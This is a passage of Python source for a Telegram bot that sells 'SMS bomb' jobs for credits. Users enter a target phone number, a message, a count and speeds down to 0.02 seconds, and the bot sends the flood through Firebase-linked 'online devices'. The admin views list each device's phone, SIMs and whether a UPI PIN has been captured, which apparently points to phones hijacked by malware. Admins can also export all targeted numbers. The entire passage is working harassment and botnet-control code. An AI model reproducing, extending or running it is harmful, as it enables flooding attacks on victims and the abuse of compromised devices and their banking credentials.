            "Example: <code>/addkey 100 5</code>",
            parse_mode=ParseMode.HTML
        )
        return

    if user_id not in ADMIN_IDS:
        await query.edit_message_text("⛔ Unauthorized.")
        return

    if data == "devices":
        await show_devices(query)
    elif data == "stats":
        await show_stats(query)
    elif data == "manage_fb":
        await manage_firebases(query)
    elif data == "add_fb":
        await query.edit_message_text(
            "📝 Send Firebase URL like:\n<code>/addfb https://your-project.firebaseio.com</code>",
            parse_mode=ParseMode.HTML
        )
    elif data.startswith("fb_delete_"):
        fid = data.split("_")[2]
        db_delete_firebase(fid)
        await query.edit_message_text(f"✅ Firebase {fid} deleted.")
        await manage_firebases(query)
    elif data.startswith("fb_test_"):
        fid = data.split("_")[2]
        fb = db_get_firebases().get(fid)
        if not fb:
            await query.edit_message_text("❌ Firebase not found.")
            return
        test = await firebase_request(fb["url"] + "?shallow=true", "GET")
        if isinstance(test, dict) and test.get("_error"):
            err_msg = test.get("message", "Unknown error")
            await query.edit_message_text(f"❌ Firebase {fid} connection failed.\nError: {err_msg}")
        else:
            await query.edit_message_text(f"✅ Firebase {fid} is working!")
    elif data.startswith("job_cancel_"):
        job_id = data.split("_")[2]
        if job_id in running_jobs:
            running_jobs[job_id].cancel()
            del running_jobs[job_id]
            db_update_job(job_id, status="cancelled", finished_at=datetime.now().isoformat())
            await query.edit_message_text(f"❌ Job {job_id} cancelled.")
        else:
            await query.edit_message_text("Job not running or already finished.")
    elif data == "back_main":
        await query.edit_message_text(
            "🔙 <b>Back to main menu.</b>",
            reply_markup=get_main_keyboard(user_id),
            parse_mode=ParseMode.HTML
        )
    else:
        await query.edit_message_text("Unknown action.")


async def show_devices(query):
    firebases = db_get_firebases()
    if not firebases:
        await query.edit_message_text("No Firebase configured. Admin please add one.")
        return
    all_devices = []
    for fid, data in firebases.items():
        devices = await get_online_devices(data["url"])
        for d in devices:
            d["fb_id"] = fid
            all_devices.append(d)
    if not all_devices:
        await query.edit_message_text("📡 No online devices found.")
        return
    text = "📡 <b>ONLINE DEVICES</b>\n" + f"{LINE}\n\n"
    for d in all_devices:
        sim_info = f"{len(d['sims'])} SIM(s)"
        try:
            bat_val = int(d['battery'].replace('%', '')) if d['battery'] != 'N/A' else 0
        except:
            bat_val = 0
        battery_icon = "🔋" if bat_val > 30 else "🪫"
        text += (
            f"<b>{d['name']}</b> (FB: {d['fb_id']})\n"
            f"🆔 <code>{d['id']}</code>\n"
            f"📱 {d['phone']}\n"
            f"{battery_icon} {d['battery']} | {sim_info}\n"
            f"{'📶 ' + d['provider'] if d.get('provider') else ''}\n"
            f"🔹 UPI PIN: {'✅' if d.get('upipin') else '❌'}\n\n"
        )
    keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="back_main")]]
    await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode=ParseMode.HTML)


async def show_stats(query):
    jobs = db_get_jobs(limit=10)
    total_jobs = len(jobs)
    completed = sum(1 for j in jobs if j["status"] == "completed")
    total_sent = sum((j.get("success_count") or 0) for j in jobs)
    total_fail = sum((j.get("fail_count") or 0) for j in jobs)
    rate = round(total_sent / (total_sent + total_fail) * 100) if (total_sent + total_fail) > 0 else 0
    text = (
        "📊 <b>PREMIUM STATISTICS</b>\n"
        f"{LINE}\n"
        f"📦 Total Jobs: {total_jobs}\n"
        f"✅ Completed: {completed}\n"
        f"📨 Total SMS Sent: {total_sent}\n"
        f"📈 Success Rate: {rate}%\n\n"
        "<b>Recent Jobs:</b>\n"
    )
    for j in jobs[:5]:
        status_emoji = {"pending": "⏳", "running": "🔄", "completed": "✅", "failed": "❌", "cancelled": "🚫", "scheduled": "⏰"}.get(j["status"], "❓")
        text += f"{status_emoji} <code>{j['id'][:8]}</code> → {j['target']} ({j['status']})\n"
    keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="back_main")]]
    await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode=ParseMode.HTML)


async def manage_firebases(query):
    firebases = db_get_firebases()
    text = "⚙️ <b>MANAGE FIREBASES</b>\n" + f"{LINE}\n\n"
    if not firebases:
        text += "No Firebase saved. Use /addfb &lt;url&gt; to add one.\n"
    else:
        for fid, data in firebases.items():
            text += f"• <b>{fid}</b>: <code>{data['url']}</code>\n"
    keyboard = []
    for fid in firebases.keys():
        row = [
            InlineKeyboardButton(f"Test {fid}", callback_data=f"fb_test_{fid}"),
            InlineKeyboardButton(f"Delete {fid}", callback_data=f"fb_delete_{fid}"),
        ]
        keyboard.append(row)
    keyboard.append([InlineKeyboardButton("➕ Add Firebase", callback_data="add_fb")])
    keyboard.append([InlineKeyboardButton("🔙 Back", callback_data="back_main")])
    await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode=ParseMode.HTML)


# ---------- BOMB WIZARD ----------
async def bomb_wizard_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if is_user_banned(user_id):
        msg = "🚫 You are banned from using this bot."
        if update.callback_query:
            await update.callback_query.answer()
            await update.callback_query.message.reply_text(msg)
        else:
            await update.message.reply_text(msg)
        return ConversationHandler.END

    prompt = (
        "💣 <b>LAUNCH BOMB</b>\n"
        f"{LINE}\n"
        "📞 Please enter the target phone number (with country code, e.g., 919876543210):\n"
        "You can also type /cancel to abort."
    )
    if update.callback_query:
        query = update.callback_query
        await query.answer()
        await query.message.reply_text(prompt, parse_mode=ParseMode.HTML)
    else:
        await update.message.reply_text(prompt, parse_mode=ParseMode.HTML)
    return TARGET


async def bomb_target(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text.strip()
    if text in ALL_BUTTONS:
        context.user_data.clear()
        await button_handler(update, context)
        return ConversationHandler.END
    if not text.isdigit():
        await update.message.reply_text("❌ Please enter a valid numeric phone number.")
        return TARGET
    context.user_data["target"] = text
    await update.message.reply_text("✏️ Now enter the message you want to send:")
    return MESSAGE


async def bomb_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text
    if text in ALL_BUTTONS:
        context.user_data.clear()
        await button_handler(update, context)
        return ConversationHandler.END
    context.user_data["message"] = text
    user_id = update.effective_user.id
    credits = get_user_credits(user_id)
    await update.message.reply_text(
        f"📨 How many SMS do you want to send? (You have <b>{credits}</b> credits, each SMS costs 1 credit)\n"
        "Enter a number:",
        parse_mode=ParseMode.HTML
    )
    return SMS_COUNT


async def bomb_sms_count(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text
    if text in ALL_BUTTONS:
        context.user_data.clear()
        await button_handler(update, context)
        return ConversationHandler.END
    try:
        count = int(text)
        if count <= 0:
            raise ValueError
    except:
        await update.message.reply_text("❌ Please enter a positive integer.")
        return SMS_COUNT
    user_id = update.effective_user.id
    credits = get_user_credits(user_id)
    if count > credits:
        await update.message.reply_text(
            f"⚠️ You have only {credits} credits. Sending {count} SMS would require {count} credits.\n"
            f"Please enter a number up to {credits} or /cancel."
        )
        return SMS_COUNT
    context.user_data["sms_count"] = count
    keyboard = [
        [InlineKeyboardButton("🐢 Slow (1s)", callback_data="speed_slow")],
        [InlineKeyboardButton("🐇 Medium (0.5s)", callback_data="speed_medium")],
        [InlineKeyboardButton("🚀 Fast (0.1s)", callback_data="speed_fast")],
        [InlineKeyboardButton("💥 Lightning (0.02s)", callback_data="speed_lightning")],
    ]
    await update.message.reply_text(
        "⚡ <b>SELECT SPEED</b>\n"
        f"{LINE}\n"
        "Choose the sending speed (delay between messages):",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode=ParseMode.HTML
    )
    return SPEED


async def bomb_speed(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data
    if data == "speed_slow":
        delay = 1.0
    elif data == "speed_medium":
        delay = 0.5
    elif data == "speed_fast":
        delay = 0.1
    elif data == "speed_lightning":
        delay = 0.02
    else:
        delay = 0.5
    context.user_data["delay"] = delay
    await query.message.reply_text(
        f"⏱️ Delay set to <b>{delay}s</b>.\n\n"
        "🕒 Do you want to schedule this bomb for later?\n"
        "Send date/time in format <code>YYYY-MM-DD HH:MM</code> (e.g., 2025-12-31 23:59) or 'now' to send immediately.",
        parse_mode=ParseMode.HTML
    )
    return SCHEDULE


async def bomb_schedule(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text.strip().lower()
    if text in ALL_BUTTONS:
        context.user_data.clear()
        await button_handler(update, context)
        return ConversationHandler.END
    try:
        if text == "now":
            schedule_time = None
        else:
            try:
                schedule_time = datetime.strptime(text, "%Y-%m-%d %H:%M")
                if schedule_time <= datetime.now():
                    await update.message.reply_text("⚠️ Scheduled time must be in the future. Send again.")
                    return SCHEDULE
            except ValueError:
                await update.message.reply_text("❌ Invalid format. Use <code>YYYY-MM-DD HH:MM</code> or 'now'.", parse_mode=ParseMode.HTML)
                return SCHEDULE

        user_id = update.effective_user.id
        chat_id = update.effective_chat.id
        target = context.user_data["target"]
        message = context.user_data["message"]
        count = context.user_data["sms_count"]
        delay = context.user_data["delay"]

        if get_user_credits(user_id) < count:
            await update.message.reply_text("❌ Insufficient credits. Please redeem a key first.")
            return ConversationHandler.END

        firebases = db_get_firebases()
        if not firebases:
            await update.message.reply_text("❌ No Firebase configured. Contact admin.")
            return ConversationHandler.END

        fb_ids = list(firebases.keys())
        job_id = str(uuid4())[:8]
        db_add_job(job_id, target, message, fb_ids, chat_id, count, delay, user_id)
        task = asyncio.create_task(execute_bomb_job(job_id, target, message, fb_ids, count, delay, user_id, schedule_time))
        running_jobs[job_id] = task

        schedule_msg = f"⏰ <b>Scheduled for:</b> <code>{schedule_time.strftime('%Y-%m-%d %H:%M')}</code>" if schedule_time else "🚀 <b>Running now...</b>"
        await update.message.reply_text(
            "✅ <b>BOMB LAUNCHED!</b> ✅\n"
            f"{LINE}\n"
            f"📦 Job ID: <code>{job_id}</code>\n"
            f"📞 Target: <code>{target}</code>\n"
            f"📨 Count: {count} | ⚡ Speed: {delay}s\n"
            f"{schedule_msg}\n"
            f"{LINE}\n"
            "📊 Progress bar will appear here shortly ✨",
            parse_mode=ParseMode.HTML
        )
        context.user_data.clear()
        return ConversationHandler.END
    except Exception as e:
        logger.error(f"Error in bomb_schedule: {e}")
        await update.message.reply_text(f"❌ An error occurred: {str(e)}")
        return ConversationHandler.END


async def cancel_conversation(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("❌ Operation cancelled.")
    return ConversationHandler.END


# ---------- COMMANDS ----------
async def quick_bomb(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if is_user_banned(user_id):
        await update.message.reply_text("🚫 You are banned.")
        return
    args = context.args
    if len(args) < 2:
        await update.message.reply_text("Usage: /bomb <target> <message>\nThis will send 1 SMS per device (max 10).")
        return
    target = args[0]
    message = " ".join(args[1:])
    count = min(10, get_user_credits(user_id))
    if count == 0:
        await update.message.reply_text("❌ You have no credits. Use /redeem or /balance.")
        return
    firebases = db_get_firebases()
    if not firebases:
        await update.message.reply_text("❌ No Firebase configured.")
        return
    fb_ids = list(firebases.keys())
    chat_id = update.effective_chat.id
    job_id = str(uuid4())[:8]
    db_add_job(job_id, target, message, fb_ids, chat_id, count, 0.1, user_id)
    task = asyncio.create_task(execute_bomb_job(job_id, target, message, fb_ids, count, 0.1, user_id, None))
    running_jobs[job_id] = task
    await update.message.reply_text(
        f"✅ <b>QUICK BOMB LAUNCHED!</b>\n" + f"{LINE}\n" +
        f"📦 Job ID: <code>{job_id}</code>\n📊 Progress will show here.",
        parse_mode=ParseMode.HTML
    )


async def balance_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    credits = get_user_credits(user_id)
    refs = count_referrals(user_id)
    text = (
        "💎 <b>PREMIUM VAULT</b>\n"
        f"{LINE}\n"
        f"💳 Balance: <b>{credits}</b> credits\n"
        f"🎁 Referrals: <b>{refs}</b>\n"
        f"{LINE}\n"
        "💡 1 SMS = 1 credit. Redeem a key to top up!"
    )
    await update.message.reply_text(text, parse_mode=ParseMode.HTML)


async def redeem_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    args = context.args
    if not args:
        await update.message.reply_text("Usage: /redeem <key>")
        return
    key = args[0].strip()
    success = db_redeem_key(key, user_id)
    if success:
        credits = get_user_credits(user_id)
        await update.message.reply_text(
            f"✅ Key redeemed! You now have <b>{credits}</b> credits.",
            parse_mode=ParseMode.HTML
        )
    else:
        await update.message.reply_text("❌ Invalid key, already used, or expired.")


async def addkey_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in ADMIN_IDS:
        await update.message.reply_text("⛔ Unauthorized.")
        return
    args = context.args
    if len(args) < 2:
        await update.message.reply_text("Usage: /addkey <credits> <max_uses>\nExample: /addkey 100 5")
        return
    try:
        credits = int(args[0])
        max_uses = int(args[1])
        if credits <= 0 or max_uses <= 0:
            raise ValueError
    except:
        await update.message.reply_text("❌ Please provide positive integers for credits and max_uses.")
        return
    key_string = generate_key_string()
    db_add_key(key_string, credits, max_uses, user_id)
    await update.message.reply_text(
        f"🔑 <b>KEY GENERATED</b>\n"
        f"{LINE}\n"
        f"🎟️ Key: <code>{key_string}</code>\n"
        f"💳 Credits: {credits}\n"
        f"♻️ Max uses: {max_uses}\n"
        f"👑 Owner: {OWNER}\n"
        f"{LINE}",
        parse_mode=ParseMode.HTML
    )


async def addcredits_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in ADMIN_IDS:
        await update.message.reply_text("⛔ Unauthorized.")
        return
    args = context.args
    if len(args) < 2:
        await update.message.reply_text("Usage: /addcredits <user_id> <amount>")
        return
    try:
        target_user = int(args[0])
        amount = int(args[1])
        if amount <= 0:
            raise ValueError
    except:
        await update.message.reply_text("❌ Invalid user_id or amount.")
        return
    update_user_credits(target_user, amount)
    await update.message.reply_text(f"✅ Added {amount} credits to user {target_user}.")


async def history_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    jobs = db_get_jobs(limit=10, user_id=user_id)
    if not jobs:
        await update.message.reply_text("📜 No jobs found yet.")
        return
    text = "📜 <b>PREMIUM HISTORY</b>\n" + f"{LINE}\n\n"
    for j in jobs:
        status_emoji = {"pending": "⏳", "running": "🔄", "completed": "✅", "failed": "❌", "cancelled": "🚫", "scheduled": "⏰"}.get(j["status"], "❓")
        text += f"{status_emoji} <code>{j['id']}</code> → {j['target']} <b>({j['status']})</b>\n"
    await update.message.reply_text(text, parse_mode=ParseMode.HTML)


async def cancel_job_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    args = context.args
    if not args:
        await update.message.reply_text("Usage: /cancel <job_id>")
        return
    job_id = args[0]
    if job_id in running_jobs:
        running_jobs[job_id].cancel()
        del running_jobs[job_id]
        db_update_job(job_id, status="cancelled", finished_at=datetime.now().isoformat())
        await update.message.reply_text(f"✅ Job {job_id} cancelled.")
    else:
        await update.message.reply_text(f"Job {job_id} not running or doesn't exist.")


async def add_firebase_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in ADMIN_IDS:
        await update.message.reply_text("⛔ Unauthorized.")
        return
    args = context.args
    if len(args) < 1:
        await update.message.reply_text(
            "Usage: <code>/addfb &lt;url&gt;</code>\n\n"
            "Add a Firebase Realtime Database URL.\n"
            "Example: <code>/addfb https://your-project.firebaseio.com</code>",
            parse_mode=ParseMode.HTML
        )
        return
    url = args[0].strip()
    if not url.startswith("http"):
        await update.message.reply_text("❌ Invalid URL. Must start with http:// or https://")
        return

    test = await firebase_request(url + "?shallow=true", "GET")

    if isinstance(test, dict) and test.get("_error"):
        status = test.get("status", 0)
        msg = test.get("message", "Unknown error")
        if status == 401:
            await update.message.reply_text(
                "❌ Authentication Error (401).\n"
                "Your Firebase database requires authentication."
            )
        elif status == 403:
            await update.message.reply_text(
                "❌ Permission Denied (403).\n"
                "Update rules to allow public read/write."
            )
        else:
            await update.message.reply_text(
                f"❌ Connection failed (HTTP {status}).\nError: {msg}"
            )
        return

    fid = str(len(db_get_firebases()) + 1)
    db_add_firebase(fid, url, "")
    await update.message.reply_text(f"✅ Firebase added with ID <code>{fid}</code>.\nURL: {url}", parse_mode=ParseMode.HTML)


async def delete_firebase_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in ADMIN_IDS:
        await update.message.reply_text("⛔ Unauthorized.")
        return
    args = context.args
    if len(args) < 1:
        await update.message.reply_text("Usage: /deletefb <id>\nExample: /deletefb 1")
        return
    fid = args[0].strip()
    firebases = db_get_firebases()
    if fid not in firebases:
        await update.message.reply_text(f"❌ Firebase with ID {fid} not found.")
        return
    db_delete_firebase(fid)
    await update.message.reply_text(f"✅ Firebase {fid} deleted.")


def escape_html(text: str) -> str:
    return text.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")


async def broadcast_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in ADMIN_IDS:
        await update.message.reply_text("⛔ Unauthorized.")
        return

    conn = _connect()
    c = conn.cursor()
    c.execute("SELECT user_id FROM users WHERE is_banned=0")
    rows = c.fetchall()
    conn.close()
    user_ids = [row[0] for row in rows]
    if not user_ids:
        await update.message.reply_text("No users found to broadcast.")
        return

    photo = None
    caption = None
    if update.message.photo:
        photo = update.message.photo[-1].file_id
        caption = update.message.caption or ""
    else:
        if context.args:
            caption = " ".join(context.args)
        else:
            await update.message.reply_text("Usage: /broadcast <message> or send a photo with caption.")
            return

    if not caption and not photo:
        await update.message.reply_text("Please provide a message or a photo with caption.")
        return

    caption_escaped = escape_html(caption) if caption else ""

    sent_count = 0
    fail_count = 0
    for uid in user_ids:
        try:
            if photo:
                await BOT.send_photo(chat_id=uid, photo=photo, caption=caption_escaped, parse_mode=ParseMode.HTML)
            else:
                await BOT.send_message(chat_id=uid, text=caption_escaped, parse_mode=ParseMode.HTML)
            sent_count += 1
            await asyncio.sleep(0.05)
        except Exception as e:
            logger.error(f"Failed to send broadcast to {uid}: {e}")
            fail_count += 1

    await update.message.reply_text(
        f"📢 Broadcast sent!\n"
        f"✅ Delivered to: {sent_count} users\n"
        f"❌ Failed: {fail_count}\n"
        f"👑 Owner: {OWNER}"
    )


# ---------- REFER ----------
async def refer_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if is_user_banned(user_id):
        await update.message.reply_text("🚫 You are banned.")
        return
    bot_username = context.bot.username
    link = f"https://t.me/{bot_username}?start=ref_{user_id}"
    refs = count_referrals(user_id)
    text = (
        "🎁 <b>REFER &amp; EARN</b>\n"
        f"{LINE}\n"
        f"🔗 <b>Your Referral Link:</b>\n<code>{link}</code>\n\n"
        f"💎 <b>Reward:</b> {REFERRAL_REWARD} credits per referral\n"
        f"📊 <b>Your Referrals:</b> {refs}\n"
        f"{LINE}\n"
        "📌 <b>Rules:</b>\n"
        "• Friend must be NEW user\n"
        "• Friend must join the channel\n"
        "• Only ONE credit per user (no fake referrals)\n"
        "• Same user can't refer twice\n"
        f"{LINE}\n"
        f"👑 Owner: {OWNER}"
    )
    await update.message.reply_text(text, parse_mode=ParseMode.HTML, disable_web_page_preview=True)


# ---------- ADMIN PANEL ----------
async def admin_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in ADMIN_IDS:
        await update.message.reply_text("⛔ Unauthorized.")
        return

    args = context.args or []
    if not args:
        text = (
            "👑 <b>ADMIN PANEL</b>\n"
            f"{LINE}\n\n"
            "🔧 <b>Commands:</b>\n\n"
            "🚫 <code>/admin ban &lt;user_id&gt;</code>\n"
            "   → Ban a user\n\n"
            "✅ <code>/admin unban &lt;user_id&gt;</code>\n"
            "   → Unban a user\n\n"
            "💰 <code>/admin sendcredit &lt;user_id&gt; &lt;amount&gt;</code>\n"
            "   → Send credits to a user\n\n"
            "💸 <code>/admin removecredit &lt;user_id&gt; &lt;amount&gt;</code>\n"
            "   → Remove credits from a user\n\n"
            "📄 <code>/admin numbers</code>\n"
            "   → Get all numbers history (txt file)\n\n"
            "🏆 <code>/admin leaderboard</code>\n"
            "   → Top users by credits\n\n"
            f"{LINE}\n"
            f"👑 Owner: {OWNER}"
        )
        await update.message.reply_text(text, parse_mode=ParseMode.HTML)
        return

    sub = args[0].lower()

    if sub == "ban":
        if len(args) < 2:
            await update.message.reply_text("Usage: /admin ban <user_id>")
            return
        try:
            target = int(args[1])
        except:
            await update.message.reply_text("❌ Invalid user ID.")
            return
        ban_user_db(target)
        await update.message.reply_text(f"🚫 User <code>{target}</code> banned.", parse_mode=ParseMode.HTML)
        return

    if sub == "unban":
        if len(args) < 2:
            await update.message.reply_text("Usage: /admin unban <user_id>")
            return
        try:
            target = int(args[1])
        except:
            await update.message.reply_text("❌ Invalid user ID.")
            return
        unban_user_db(target)
        await update.message.reply_text(f"✅ User <code>{target}</code> unbanned.", parse_mode=ParseMode.HTML)
        return

    if sub == "sendcredit":
        if len(args) < 3:
            await update.message.reply_text("Usage: /admin sendcredit <user_id> <amount>")
            return
        try:
            target = int(args[1]); amount = int(args[2])
            if amount <= 0: raise ValueError
        except:
            await update.message.reply_text("❌ Invalid user ID or amount.")
            return
        update_user_credits(target, amount)
        new_bal = get_user_credits(target)
        await update.message.reply_text(
            f"💰 Sent <b>{amount}</b> credits to <code>{target}</code>\n💳 New balance: <b>{new_bal}</b>",
            parse_mode=ParseMode.HTML
        )
        try:
            await context.bot.send_message(
                chat_id=target,
                text=f"🎁 <b>Admin has sent you {amount} credits!</b>\n💳 New balance: {new_bal}",
                parse_mode=ParseMode.HTML
            )
        except Exception:
            pass
        return

    if sub == "removecredit":
        if len(args) < 3:
            await update.message.reply_text("Usage: /admin removecredit <user_id> <amount>")
            return
        try:
            target = int(args[1]); amount = int(args[2])
            if amount <= 0: raise ValueError
        except:
            await update.message.reply_text("❌ Invalid user ID or amount.")
            return
        update_user_credits(target, -amount)
        new_bal = get_user_credits(target)
        await update.message.reply_text(
            f"💸 Removed <b>{amount}</b> credits from <code>{target}</code>\n💳 New balance: <b>{new_bal}</b>",
            parse_mode=ParseMode.HTML
        )
        return

    if sub == "numbers":
        jobs = db_get_jobs(limit=100000)
        if not jobs:
            await update.message.reply_text("📄 No numbers found.")
            return
        lines = ["JOB_ID | USER_ID | TARGET | SMS | STATUS | CREATED_AT"]
        lines.append("=" * 90)
        for j in jobs:
            lines.append(
                f"{j.get('id','')} | {j.get('user_id','')} | {j.get('target','')} | "
                f"{j.get('total_sms', 0)} | {j.get('status','')} | {j.get('created_at','')}"
            )
        content = "\n".join(lines)
        bio = io.BytesIO(content.encode("utf-8"))
        bio.name = f"numbers_history_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        await update.message.reply_document(document=bio, filename=bio.name,
                                            caption=f"📄 Total jobs: {len(jobs)}")
        return

    if sub == "leaderboard":
        rows = get_leaderboard(limit=20)
        if not rows:
            await update.message.reply_text("📊 No users yet.")
            return
        text = "🏆 <b>TOP USERS — LEADERBOARD</b>\n" + f"{LINE}\n\n"
        medals = ["🥇", "🥈", "🥉"]
        for i, (uid, credits, fname, uname) in enumerate(rows):
            medal = medals[i] if i < 3 else f"{i+1}."
            display = f"@{uname}" if uname else (fname or "User")
            text += f"{medal} <code>{uid}</code> — <b>{credits}</b> credits ({display})\n"
        text += f"\n{LINE}\n👑 Owner: {OWNER}"
        await update.message.reply_text(text, parse_mode=ParseMode.HTML)
        return

    await update.message.reply_text("Unknown subcommand. Use /admin for help.")


# ---------- BUTTON HANDLER ----------
async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text
    user_id = update.effective_user.id

    if is_user_banned(user_id):
        await update.message.reply_text("🚫 You are banned from using this bot.")
        return

    if text not in ["/start", "/ping"]:
        joined, missing = await check_channel_membership(user_id, context.bot)
        if not joined:
            ch_list = "\n".join([f"• {ch}" for ch in missing])
            await update.message.reply_text(
                f"⚠️ <b>Please join all channels to use this bot!</b>\n\nMissing:\n{ch_list}\n\n"
                f"👑 <b>Owner:</b> {OWNER}\n\n"
                "Join the channels below and click ✅ I've Joined:",
                reply_markup=get_join_keyboard(),
                parse_mode=ParseMode.HTML,
            )
            return

    await try_pay_referral(context, user_id)

    if context.user_data.get("awaiting_redeem"):
        key = text.strip()
        success = db_redeem_key(key, user_id)
        if success:
            credits = get_user_credits(user_id)
            await update.message.reply_text(
                f"🎟️ <b>KEY REDEEMED!</b>\n" + f"{LINE}\n" +
                f"💳 You now have <b>{credits}</b> credits.\n" + f"{LINE}",
                parse_mode=ParseMode.HTML
            )
        else:
            await update.message.reply_text("❌ Invalid key, already used, or expired.")
        context.user_data.pop("awaiting_redeem", None)
        return

    if text == "💣 Launch Bomb":
        await bomb_wizard_start(update, context)
    elif text == "💰 Balance":
        await balance_command(update, context)
    elif text == "📊 Status":
        jobs = db_get_jobs(limit=10, user_id=user_id)
        if not jobs:
            await update.message.reply_text("📊 You have no bombing jobs yet.")
            return
        text_out = "📊 <b>PREMIUM STATUS REPORT</b>\n" + f"{LINE}\n\n"
        for j in jobs:
            status_emoji = {"pending": "⏳", "running": "🔄", "completed": "✅", "failed": "❌", "cancelled": "🚫", "scheduled": "⏰"}.get(j["status"], "❓")
            success = j.get("success_count", 0) or 0
            fail = j.get("fail_count", 0) or 0
            total = j.get("total_sms", 0) or 0
            credit_used = j.get("credit_used", 0) or 0
            text_out += (
                f"{status_emoji} <b>Job:</b> <code>{j['id']}</code>\n"
                f"   🎯 Target: <code>{j['target']}</code>\n"
                f"   📨 Total: {total} | ✅ {success} | ❌ {fail}\n"
                f"   💳 Cost: {credit_used} | 🕒 {j['created_at'][:16]}\n"
                f"   📌 <b>{j['status']}</b>\n"
                f"   {'─' * 29}\n"
            )
        await update.message.reply_text(text_out, parse_mode=ParseMode.HTML)
    elif text == "📜 History":
        await history_command(update, context)
    elif text == "🔑 Redeem Key":
        context.user_data["awaiting_redeem"] = True
        await update.message.reply_text(
            "🔑 <b>REDEEM KEY</b>\n"
            f"{LINE}\n"
            "Please send the key you want to redeem.\n"
            "Example: <code>ABCD1234</code> 🎟️",
            parse_mode=ParseMode.HTML
        )
    elif text == "🎁 Refer & Earn":
        await refer_command(update, context)
    elif text == "📡 Online Devices" and user_id in ADMIN_IDS:
        await show_devices_from_message(update)
    elif text == "📊 Stats & History" and user_id in ADMIN_IDS:
        await show_stats_from_message(update)
    elif text == "⚙️ Manage Firebases" and user_id in ADMIN_IDS:
        await manage_firebases_from_message(update)
    elif text == "🔑 Generate Key" and user_id in ADMIN_IDS:
        await update.message.reply_text(
            "🔑 <b>GENERATE KEY (ADMIN)</b>\n"
            f"{LINE}\n"
            "To generate a key, use:\n<code>/addkey &lt;credits&gt; &lt;max_uses&gt;</code>\n"
            "Example: <code>/addkey 100 5</code>",
            parse_mode=ParseMode.HTML
        )
    elif text == "👑 Admin Panel" and user_id in ADMIN_IDS:
        context.args = []
        await admin_panel(update, context)
    else:
        pass


async def show_devices_from_message(update):
    firebases = db_get_firebases()
    if not firebases:
        await update.message.reply_text("No Firebase configured. Admin please add one.")
        return
    all_devices = []
    for fid, data in firebases.items():
        devices = await get_online_devices(data["url"])
        for d in devices:
            d["fb_id"] = fid
            all_devices.append(d)
    if not all_devices:
        await update.message.reply_text("📡 No online devices found.")
        return
    text = "📡 <b>ONLINE DEVICES</b>\n" + f"{LINE}\n\n"
    for d in all_devices:
        sim_info = f"{len(d['sims'])} SIM(s)"
        try:
            bat_val = int(d['battery'].replace('%', '')) if d['battery'] != 'N/A' else 0
        except:
            bat_val = 0
        battery_icon = "🔋" if bat_val > 30 else "🪫"
        text += (
            f"<b>{d['name']}</b> (FB: {d['fb_id']})\n"
            f"🆔 <code>{d['id']}</code>\n"
            f"📱 {d['phone']}\n"
            f"{battery_icon} {d['battery']} | {sim_info}\n"
            f"{'📶 ' + d['provider'] if d.get('provider') else ''}\n"
            f"🔹 UPI PIN: {'✅' if d.get('upipin') else '❌'}\n\n"
        )
    await update.message.reply_text(text, parse_mode=ParseMode.HTML)


async def show_stats_from_message(update):
    jobs = db_get_jobs(limit=10)
    total_jobs = len(jobs)
    completed = sum(1 for j in jobs if j["status"] == "completed")
    total_sent = sum((j.get("success_count") or 0) for j in jobs)
    total_fail = sum((j.get("fail_count") or 0) for j in jobs)
    rate = round(total_sent / (total_sent + total_fail) * 100) if (total_sent + total_fail) > 0 else 0
    text = (
        "📊 <b>PREMIUM STATISTICS</b>\n"
        f"{LINE}\n"
        f"📦 Total Jobs: {total_jobs}\n"
        f"✅ Completed: {completed}\n"
        f"📨 Total SMS Sent: {total_sent}\n"
        f"📈 Success Rate: {rate}%\n\n"
        "<b>Recent Jobs:</b>\n"
    )
    for j in jobs[:5]:
        status_emoji = {"pending": "⏳", "running": "🔄", "completed": "✅", "failed": "❌", "cancelled": "🚫", "scheduled": "⏰"}.get(j["status"], "❓")
        text += f"{status_emoji} <code>{j['id'][:8]}</code> → {j['target']} ({j['status']})\n"
    await update.message.reply_text(text, parse_mode=ParseMode.HTML)


async def manage_firebases_from_message(update):
    firebases = db_get_firebases()
    text = "⚙️ <b>MANAGE FIREBASES</b>\n" + f"{LINE}\n\n"
    if not firebases:
        text += "No Firebase saved. Use /addfb &lt;url&gt; to add one.\n"
    else:
        for fid, data in firebases.items():
            text += f"• <b>{fid}</b>: <code>{data['url']}</code>\n"
    text += "\nUse /addfb to add new, or /deletefb &lt;id&gt; to remove."
    await update.message.reply_text(text, parse_mode=ParseMode.HTML)


# ---------- MAIN ----------
def main():
    global BOT

